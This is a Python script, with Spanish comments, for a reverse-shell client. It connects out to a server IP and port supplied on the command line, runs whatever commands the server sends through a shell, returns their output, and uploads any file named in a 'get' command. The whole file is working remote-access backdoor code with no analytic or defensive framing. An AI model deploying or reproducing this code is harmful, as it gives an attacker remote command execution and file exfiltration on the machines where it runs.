import socket
import sys
import subprocess
import os
import time

class Client(object):
    def __init__(self, ip, port):
        try:
            self.client = socket.socket()
            self.client.connect((ip, int(port)))

            not_salida = False
            while True:
                command = self.client.recv(1024).decode('UTF-8')
                if not command:
                    self.client.close()
                    break
                cmd = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                if 'cd' in command:
                    self.command_cd(command)
                    salida = 'change dir'
                elif 'get' in command:
                    file = command.split()[1]
                    with open(file, 'rb') as f:
                        while True:
                            a = f.read(1024)
                            if not a:
                                break
                            self.client.send(a)
                        time.sleep(0.5)
                        self.client.send('EOF'.encode())
                        time.sleep(1)
                        salida = "Send"
                else:
                    output = cmd.stdout.read()
                    output_error = cmd.stderr.read()
                    salida = output + output_error
                
                try:
                    self.client.send(salida.encode('UTF-8'))
                    print("ASDAFHUJIDASKOF")
                except:
                    self.client.send(salida)
        except:
            raise
    
    def command_cd(self, command):
        # Linux
        current = os.getcwd().split('/')
        if command == 'cd ..':
            path = '/'.join(current[:-1])
            print(path)
            os.chdir(path)
        else:
            try:
                path = command.replace('cd ', '')
                print(path)
                if '/' in path:
                    print("A")
                    move_path = path
                else:
                    current.append(path)
                    move_path = '/'.join(current)
                os.chdir(move_path)
            except Exception as e:
                print(e)
        

#Introducir IP servidor como argumento a la hora de ejecutar el script o como input si no se ha introducido anteriormente
if len(sys.argv) == 1:
    ip, port = input('Ip servidor: '), input('Puerto: ')
else:
    ip, port = sys.argv[1], sys.argv[2]

client = Client(ip, port)
